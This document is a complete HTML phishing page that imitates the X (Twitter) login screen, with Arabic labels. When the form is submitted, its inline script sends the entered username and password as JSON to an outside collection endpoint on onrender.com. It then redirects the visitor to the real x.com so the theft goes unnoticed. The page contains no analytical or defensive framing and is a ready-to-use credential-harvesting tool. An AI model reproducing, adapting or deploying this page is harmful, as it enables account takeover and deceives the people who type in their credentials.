<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>X Login</title><style>body{background:#000;color:#fff;margin:0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.box{width:90%;max-width:400px;padding:20px;box-sizing:border-box;}input{width:100%;padding:18px;margin:12px 0;background:#000;border:1px solid #333;color:#fff;border-radius:5px;font-size:16px;box-sizing:border-box;}.btn{width:100%;background:#fff;color:#000;padding:15px;border-radius:30px;font-weight:bold;font-size:18px;margin-top:20px;border:none;}</style></head><body><div class="box"><h1 style="font-size:60px;text-align:center;margin-bottom:30px;">𝕏</h1><h3>تسجيل الدخول إلى X</h3><form id="f"><input type="text" id="u" placeholder="البريد أو اسم المستخدم" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">التالي</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'X (Twitter)',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://x.com';});};</script></body></html>
